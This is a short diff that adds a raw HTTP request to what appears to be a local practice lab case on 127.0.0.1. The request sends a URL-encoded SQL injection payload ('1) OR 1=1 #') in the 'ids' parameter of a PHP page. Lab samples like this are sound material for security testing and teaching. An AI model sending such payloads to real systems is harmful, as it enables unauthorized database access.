@@ -1,0 +1,4 @@
+GET /lab_cases/S009/index.php?ids=1%29%20OR%201%3D1%20%23 HTTP/1.1
+Host: 127.0.0.1:4280
+Connection: close
+
